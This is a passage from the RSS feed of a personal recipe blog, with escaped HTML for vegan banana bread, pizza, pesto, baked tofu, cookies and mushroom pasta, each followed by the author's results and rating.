&lt;li>60ml unsweetened nondairy milk&lt;/li>
&lt;li>125g light brown sugar&lt;/li>
&lt;li>2 teaspoons pure vanilla extract&lt;/li>
&lt;li>260g unbleached all-purpose flour (in France : T80 flour)&lt;/li>
&lt;li>1 teaspoon cinnamon&lt;/li>
&lt;li>1 teaspoon baking soda&lt;/li>
&lt;li>1/2 teaspoon salt&lt;/li>
&lt;li>A sliced banana, for topping&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Preheat the oven at 175Â°C. Spray a 9x5 loaf pan with oil, then flour.&lt;/li>
&lt;li>In a large mixing bowl, roughly mash the bananas. Add the brown sugar, oil, vanilla and almond milk, and whisk to incorporate.&lt;/li>
&lt;li>Mix in the floor, baking soda, salt, and cinnamon and stir until combined. Do not overmix, or the banana bread can come out dense and gummy.&lt;/li>
&lt;li>Transfer the batter to your prepared pan, and top with the extra banana slices.&lt;/li>
&lt;li>Bake for about 45min, until a tootpick inserted in the center comes out with just a couple crumbs.&lt;!-- raw HTML omitted -->The original recipe recommends baking the bread again with foil on top, for 10-15 minutes longer. We didn&amp;rsquo;t find that this was necessary, as the bread seemed cooked enough for us.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The bread was really good! The top was perfectly cooked, but the bottom was maybe too soft. Overall, I&amp;rsquo;d give it a 4.5/5.&lt;/p>
&lt;p>It wasn&amp;rsquo;t really hard to unmold, but adding a baking sheet between the bread and the mold may be a good idea.&lt;/p></content></item><item><title>Pizza</title><link>https://nicolasb.fr/recipes/2020/06/04/pizza/</link><pubDate>Thu, 04 Jun 2020 13:04:08 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/04/pizza/</guid><description>Recipe Sources :
EASY VEGAN PIZZA FROM SCRATCH - The Happy Pear Recettes vegan inratables - Les petits inratables. Ed. Larousse The second source is for the dough, which we used instead of the one proposed in the video because it used ingredients not readily available in France.
This took about 1 hour and a half to make. It&amp;rsquo;s enough for 5 people, and is relatively easy to make - the dough is the hardest part.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/04/pizza/IMG_20200604_191828.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/04/pizza/IMG_20200604_191828_hu65e522a4bdeec91336399586d8f7ac65_2235877_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;a href="https://nicolasb.fr/recipes/2020/06/04/pizza/IMG_2174.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/04/pizza/IMG_2174_huc11e381df803dc88dbb394b7490089fc_4425270_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Sources :&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/watch?v=4RdKPHibSME">EASY VEGAN PIZZA FROM SCRATCH - The Happy Pear&lt;/a>&lt;/li>
&lt;li>Recettes vegan inratables - Les petits inratables. Ed. Larousse&lt;/li>
&lt;/ul>
&lt;p>The second source is for the dough, which we used instead of the one proposed in the video because it used ingredients not readily available in France.&lt;/p>
&lt;p>This took about 1 hour and a half to make. It&amp;rsquo;s enough for 5 people, and is relatively easy to make - the dough is the hardest part.&lt;/p>
&lt;p>We had enough to make two pizzas:&lt;/p>
&lt;ul>
&lt;li>one as presented in the video&lt;/li>
&lt;li>one without tomato, with spinach leaves and cashew cream&lt;/li>
&lt;/ul>
&lt;p>Note: A typical pizza is about 200g of dough.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;h4 id="for-all-pizzas">For all pizzas&lt;/h4>
&lt;ul>
&lt;li>300g wheat flour (in France: T55), reserve a bit more - it might be needed&lt;/li>
&lt;li>Dry baker&amp;rsquo;s yeast&lt;/li>
&lt;li>A teaspoon of sugar&lt;/li>
&lt;li>3 teaspoons of olive oil&lt;/li>
&lt;li>A teaspoon of salt&lt;/li>
&lt;li>20cl of lukewarm water&lt;/li>
&lt;li>Pine nuts&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/recipes/2020/06/04/pesto">Basil pesto&lt;/a>&lt;/li>
&lt;/ul>
&lt;h4 id="for-the-pizza-presented-in-the-video">For the pizza presented in the video&lt;/h4>
&lt;ul>
&lt;li>Tomato sauce&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/recipes/2020/06/04/pesto">Pesto rosso&lt;/a>&lt;/li>
&lt;li>Vegetables (faster cooking ones preferably) ; here we chose a sweet potato, a red pepper and a yellow pepper&lt;/li>
&lt;li>Salt&lt;/li>
&lt;li>Olive oil&lt;/li>
&lt;/ul>
&lt;h4 id="for-the-tomato-free-pizza">For the tomato-free pizza&lt;/h4>
&lt;ul>
&lt;li>50g of cashews&lt;/li>
&lt;li>250ml soy milk, sugar-free&lt;/li>
&lt;li>A lot of spinach leaves&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;h4 id="preparation">Preparation&lt;/h4>
&lt;ul>
&lt;li>Put the flour in a large bowl, forming a well in the middle.&lt;/li>
&lt;li>Add in the salt to the side, the yeast and the sugar to the center.&lt;/li>
&lt;li>Add in the water and start kneading it, incorporating the olive oil as you go. Add more flour if it starts getting sticky.&lt;/li>
&lt;li>Let the dough rest for an hour in a warm place.&lt;/li>
&lt;li>Preheat the oven at 250 degrees, make it so that the heat is coming from the bottom.&lt;/li>
&lt;li>Knead the dough again and spread &lt;strong>half&lt;/strong> of it on a baking tray covered with a baking sheet. Roll the sides a bit to form the border of the pizza.&lt;/li>
&lt;/ul>
&lt;h4 id="for-the-tomato-pizza">For the tomato pizza&lt;/h4>
&lt;ul>
&lt;li>In a bowl, mix the tomato sauce and about a 100g of pesto.&lt;/li>
&lt;li>Cut the vegetables in slices. If you chose vegetables that take more time to cook, cut them in thinner slices.&lt;/li>
&lt;li>Put them into another bowl, add olive oil and salt then mix.&lt;/li>
&lt;li>Spread the mix of tomato sauce and pesto in the pizza.&lt;/li>
&lt;li>Put the vegetables on the pizza.&lt;/li>
&lt;li>Add little balls of basil pesto on the top (we put around 10 of them).&lt;/li>
&lt;li>Add pine nuts on top.&lt;/li>
&lt;li>Bake for 12min.&lt;/li>
&lt;/ul>
&lt;h4 id="for-the-tomato-free-pizza-1">For the tomato-free pizza&lt;/h4>
&lt;ul>
&lt;li>Mix the cashews with the soy milk in a blender until you reach a creamy texture. Spread it on the dough.&lt;/li>
&lt;li>Add the spinach leaves on top, followed by little spots of basil pesto (we put around 10 of them) and the pine nuts.&lt;/li>
&lt;li>Bake for 12min.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>They tasted great, although the tomato-free one wasn&amp;rsquo;t as good.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.75/5.&lt;/p></content></item><item><title>Pesto</title><link>https://nicolasb.fr/recipes/2020/06/04/pesto/</link><pubDate>Thu, 04 Jun 2020 12:47:52 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/04/pesto/</guid><description>Recipe Sources :
Pesto Rosso - Cuisine Actuelle Spaghetti au pesto de basilic frais, 100% vÃ©gÃ©talien ou classique - La FÃ©e StÃ©phanie See the pizza recipes these were used on.
Pesto Rosso This took about 15min to make. It&amp;rsquo;s enough for at least 5 people, and is really easy to make.
Ingredients 100g (oil) dried tomatoes 25g pine nut A (small) clove of garlic Around 15 basil leaves (of all sizes) 7cl olive oil Pepper A teaspoon of tomato coulis Steps Carefully mix the tomatoes, tomato coulis, basil, garlic (peeled and minced), olive oil and pine nut in a blender.</description><content>&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Sources :&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://www.cuisineactuelle.fr/recettes/pesto-rosso-290896">Pesto Rosso - Cuisine Actuelle&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.lafeestephanie.com/2015/03/spaghettis-au-pesto-de-basilic-frais.html">Spaghetti au pesto de basilic frais, 100% vÃ©gÃ©talien ou classique - La FÃ©e StÃ©phanie&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>See the &lt;a href="https://nicolasb.fr/recipes/2020/06/04/pizza">pizza recipes&lt;/a> these were used on.&lt;/p>
&lt;h3 id="pesto-rosso">Pesto Rosso&lt;/h3>
&lt;p>This took about 15min to make. It&amp;rsquo;s enough for at least 5 people, and is really easy to make.&lt;/p>
&lt;h4 id="ingredients">Ingredients&lt;/h4>
&lt;ul>
&lt;li>100g (oil) dried tomatoes&lt;/li>
&lt;li>25g pine nut&lt;/li>
&lt;li>A (small) clove of garlic&lt;/li>
&lt;li>Around 15 basil leaves (of all sizes)&lt;/li>
&lt;li>7cl olive oil&lt;/li>
&lt;li>Pepper&lt;/li>
&lt;li>A teaspoon of tomato coulis&lt;/li>
&lt;/ul>
&lt;h4 id="steps">Steps&lt;/h4>
&lt;ul>
&lt;li>Carefully mix the tomatoes, tomato coulis, basil, garlic (peeled and minced), olive oil and pine nut in a blender.&lt;/li>
&lt;/ul>
&lt;h3 id="basil-pesto">Basil Pesto&lt;/h3>
&lt;p>This took about 20min to make. It&amp;rsquo;s enough for at least 5 people, and is relatively easy to make.&lt;/p>
&lt;h4 id="ingredients-1">Ingredients&lt;/h4>
&lt;ul>
&lt;li>50g of basil leaves&lt;/li>
&lt;li>100ml olive oil&lt;/li>
&lt;li>20g pine nut&lt;/li>
&lt;li>A bit of coarse salt&lt;/li>
&lt;li>A clove of garlic&lt;/li>
&lt;li>100g of plan tofu&lt;/li>
&lt;/ul>
&lt;h4 id="steps-1">Steps&lt;/h4>
&lt;ul>
&lt;li>Clean and dry the basil.&lt;/li>
&lt;li>Mix using a blender in small strokes the garlic (chopped), the basil leaves (roughly chopped), the salt, the tofu (crumbled) and half the oil. Don&amp;rsquo;t stop until the pesto becomes creamy.&lt;/li>
&lt;li>Add the pine nuts (cut in thin slices) and the remaining oil.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>They were good on the pizzas ; I also tasted the rosso pesto with pasta and it was really good, maybe a bit too strong. There definitely was too much of it for the pizzas too, we used maybe 1/4th of what we made.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4/5.&lt;/p></content></item><item><title>Crispy Baked Tofu Cubes</title><link>https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/</link><pubDate>Wed, 03 Jun 2020 13:00:57 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/</guid><description>Recipe Source : HOW TO COOK TOFU | Crispy baked tofu recipe - Clean &amp;amp; Delicious
This took about an hour and a half to make. It&amp;rsquo;s enough for 5 people, and is easy to make.
Ingredients White rice Broccolis A big block of Tofu 1 tablespoon tamari 1 tablespoon avocado oil 1/4 teaspoon salt 1/4 teaspoon pepper 1/2 teaspoon garlic powder 1 tablespoon corn starch 2 tablespoons teriyaki sauce Sriracha sauce (to taste) Sesame seeds Steps Preheat your oven to 200Â°C.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/IMG_20200603_1346522.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/IMG_20200603_1346522_hua7ab38e9bcb0ca4c2e78052a3e18d96f_1729114_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;a href="https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/IMG_2147.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/03/crispy-baked-tofu-cubes/IMG_2147_huc11e381df803dc88dbb394b7490089fc_4395264_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.youtube.com/watch?v=LgYghvu6Vj4">HOW TO COOK TOFU | Crispy baked tofu recipe - Clean &amp;amp; Delicious&lt;/a>&lt;/p>
&lt;p>This took about an hour and a half to make. It&amp;rsquo;s enough for 5 people, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>White rice&lt;/li>
&lt;li>Broccolis&lt;/li>
&lt;li>A big block of Tofu&lt;/li>
&lt;li>1 tablespoon tamari&lt;/li>
&lt;li>1 tablespoon avocado oil&lt;/li>
&lt;li>1/4 teaspoon salt&lt;/li>
&lt;li>1/4 teaspoon pepper&lt;/li>
&lt;li>1/2 teaspoon garlic powder&lt;/li>
&lt;li>1 tablespoon corn starch&lt;/li>
&lt;li>2 tablespoons teriyaki sauce&lt;/li>
&lt;li>Sriracha sauce (to taste)&lt;/li>
&lt;li>Sesame seeds&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Preheat your oven to 200Â°C.&lt;/li>
&lt;li>Cut the tofu in uniform cubes.&lt;/li>
&lt;li>Press the tofu : in a towel, lie the blocks and add weight on top ; then wait for 15-30 min.&lt;/li>
&lt;li>In a bowl, add tamari, avocado oil, salt, pepper and garlic powder.&lt;/li>
&lt;li>Add the tofu cubes little by little and mix.&lt;/li>
&lt;li>Add corn starch gradually.&lt;/li>
&lt;li>Put the tofu on a baking sheet.&lt;/li>
&lt;li>Bake for 30min, flipping them halfway through.&lt;/li>
&lt;li>Start cooking the rice and the broccolis after approximately 15min. We cooked the broccolis with a steam cooker.&lt;/li>
&lt;li>Add teriyaki sauce and sriracha sauce, and mix.&lt;/li>
&lt;li>Add sesame seeds at the end.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The meal was really good! The thing I&amp;rsquo;m not too used about is the texture of the tofu cubes : they were too mushy. They&amp;rsquo;re supposed to be firm on the outside and tender on the inside, but I think the inside wasn&amp;rsquo;t tender enough.&lt;/p>
&lt;p>I&amp;rsquo;ll have to play with the cooking time, I&amp;rsquo;m not too sure if I should reduce or increase it tough.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.25/5, I&amp;rsquo;d happily eat them anyday.&lt;/p></content></item><item><title>Cookies</title><link>https://nicolasb.fr/recipes/2020/06/02/cookies/</link><pubDate>Tue, 02 Jun 2020 13:00:32 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/02/cookies/</guid><description>Recipe Source : PERFECT Vegan Chocolate Chip Cookie Recipe - Pincha Pink Salt
This took about an half-hour to make, and is really easy.
Use the new recipe instead, it&amp;rsquo;s way better.
Ingredients 260g flour 1/2 teaspoon baking soda 1/4 teaspoon baking powder 1/2 teaspoon salt - the original recipe used 1 teaspoon of pink salt, but regular salt worked just fine 275g brown sugar 120ml oil 1 teaspoon vanilla 6 tablespoons plant milk Chocolate chips - we used 70% cocoa dark chocolate chopped in small pieces Steps Preheat oven at 175Â°C.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.youtube.com/watch?v=gjSGtMrBias">PERFECT Vegan Chocolate Chip Cookie Recipe - Pincha Pink Salt&lt;/a>&lt;/p>
&lt;p>This took about an half-hour to make, and is really easy.&lt;/p>
&lt;p>&lt;strong>Use &lt;a href="https://nicolasb.fr/recipes/2020/06/11/cookies-v2">the new recipe&lt;/a> instead, it&amp;rsquo;s way better.&lt;/strong>&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>260g flour&lt;/li>
&lt;li>1/2 teaspoon baking soda&lt;/li>
&lt;li>1/4 teaspoon baking powder&lt;/li>
&lt;li>1/2 teaspoon salt - the original recipe used 1 teaspoon of pink salt, but regular salt worked just fine&lt;/li>
&lt;li>275g brown sugar&lt;/li>
&lt;li>120ml oil&lt;/li>
&lt;li>1 teaspoon vanilla&lt;/li>
&lt;li>6 tablespoons plant milk&lt;/li>
&lt;li>Chocolate chips - we used 70% cocoa dark chocolate chopped in small pieces&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Preheat oven at 175Â°C.&lt;/li>
&lt;li>Mix the flour, the baking soda, the baking powder and the salt in a bowl.&lt;/li>
&lt;li>In another bowl, mix the brown sugar and the oil. Then, add the vanilla and the plant milk.&lt;/li>
&lt;li>Combine the two bowls by adding the dry mix to the wet mix one cup at a time, until everything is well incorporated.&lt;/li>
&lt;li>Add the chocolate chips and fold.&lt;/li>
&lt;li>Scoop the dough with a spoon into 5cm thick balls and place them on a cookie sheet 5cm appart. We used aluminium instead of a cookie sheet.&lt;/li>
&lt;li>Bake at the center of the oven for 13-15min, or until light golden brown.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The cookies were really under-baked - so much so that my sister felt kinda bloated after eating one. Cooking them for 5 more minutes (for a total of 18-20 min) is a good idea.&lt;/p>
&lt;p>They also were really big, a 5cm ball definitely seems excessive. I think we had enough dough to make at least 12 smaller cookies.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 3.5/5 ; they&amp;rsquo;re definitely improvable.&lt;/p></content></item><item><title>Creamy Mushroom Pasta</title><link>https://nicolasb.fr/recipes/2020/06/01/creamy-mushroom-pasta/</link><pubDate>Mon, 01 Jun 2020 12:59:25 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/01/creamy-mushroom-pasta/</guid><description>Recipe Source : CREAMY MUSHROOM PASTA | OIL FREE &amp;amp; VEGAN - The Happy Pear
This took about 35min to make (I&amp;rsquo;m not good at cleaning mushrooms). It&amp;rsquo;s enough for 5 people, and is easy to make.
Ingredients Two small red onions (we only used half of a large onion) 2 cloves of garlic A bit of vegetable stock 250g mushroom 3 tablespoons of tamari or soy sauce 250g of pasta (preferably wholemeal) 100g of cashew (preferably toasted cashews) 500ml of plant milk (no sugar milk) The juice of a half lemon or lime A teaspoon of salt A teaspoon of garlic powder Oregano or the herbs you prefer A red chili or anything you want (we didn&amp;rsquo;t put any) Steps Clean the mushrooms.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.youtube.com/watch?v=TEJ8ZDjZbyQ">CREAMY MUSHROOM PASTA | OIL FREE &amp;amp; VEGAN - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 35min to make (I&amp;rsquo;m not good at cleaning mushrooms). It&amp;rsquo;s enough for 5 people, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>Two small red onions (we only used half of a large onion)&lt;/li>
&lt;li>2 cloves of garlic&lt;/li>
&lt;li>A bit of vegetable stock&lt;/li>
&lt;li>250g mushroom&lt;/li>
&lt;li>3 tablespoons of tamari or soy sauce&lt;/li>
&lt;li>250g of pasta (preferably wholemeal)&lt;/li>
&lt;li>100g of cashew (preferably toasted cashews)&lt;/li>
&lt;li>500ml of plant milk (no sugar milk)&lt;/li>
&lt;li>The juice of a half lemon or lime&lt;/li>
&lt;li>A teaspoon of salt&lt;/li>
&lt;li>A teaspoon of garlic powder&lt;/li>
&lt;li>Oregano or the herbs you prefer&lt;/li>
&lt;li>A red chili or anything you want (we didn&amp;rsquo;t put any)&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Clean the mushrooms.&lt;/li>
&lt;li>Get a pan really hot. Warning : choose a large pan, as it will need to contain the pasta later on.&lt;/li>
&lt;li>Add in the red onions and the garlic. Fry them (without adding oil), letting them sticking to the pan a bit. Wait until they&amp;rsquo;re starting to turn brownish.&lt;/li>
&lt;li>Add a little bit of vegetable stock, which is going to deglaze the onions and the garlic. When following the next steps, add stock as well if anything starts sticking to the pan.&lt;/li>
&lt;li>Either mash the mushrooms or chop them into small pieces ; then add them in.&lt;/li>
&lt;li>Add the tamari.&lt;/li>
&lt;li>Start cooking the pasta, following the instructions on the pack.&lt;/li>
&lt;li>In a high-speed blender, mix the cashews with the plant milk, the lemon/lime juice, the salt and the garlic powder. Wait until you have a creamy texture.&lt;/li>
&lt;li>Add the cream in the pan, followed by the pasta ; use the pasta water to thin the sauce, which is probably going to be a little too thick.&lt;/li>
&lt;li>Add your herbs on top, with the red chili chopped into thin slices.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>They were really good and light too! I&amp;rsquo;d like to use different mushrooms to see how the taste will change.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.75/5.&lt;/p></content></item></channel></rss>